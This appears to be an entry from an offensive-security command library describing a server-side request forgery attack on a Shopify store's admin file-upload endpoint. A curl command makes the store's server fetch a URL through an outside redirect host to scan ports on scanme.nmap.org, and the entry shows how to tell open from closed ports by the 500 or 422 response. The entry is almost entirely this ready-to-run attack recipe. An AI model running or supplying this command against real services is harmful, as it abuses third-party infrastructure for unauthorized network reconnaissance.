---
data: >-
  curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' -H
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H
  'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' -H 'Cookie:
  COOKIES' -d
  'src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:PORT'
tags:
  - ssrf
  - scanning
type: command
output: HTTP/1.1 500 or 422 based on port status
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.409Z'
id: be7059f2-e575-496a-897c-4b30b1bdda03
verified: false
validated: true
submitted: true
---
# perform-port-scan-on-external-host

## Command

```bash
curl -X POST 'https://test-4925.myshopify.com/admin/settings/files.json' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -H 'Cookie: COOKIES' \
  -d 'src=http%3A%2F%2Fhettoteam.tk/r.php?r=http://scanme.nmap.org:PORT'
```

## Description

Scans ports on an external host via SSRF by varying the PORT in the redirect target.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `PORT` | Target port (e.g., 22) | Yes |

## Examples

### Basic Usage

```bash
# Port 22 (open)
curl ... -d 'src=...scanme.nmap.org:22'
```

### Advanced Usage

```bash
# Port 1 (closed)
curl ... -d 'src=...scanme.nmap.org:1'
```

## Expected Output

500 for open ports, 422 for closed.

## Related

- [[commands/verify-internal-scan-on-shopify-ip]]
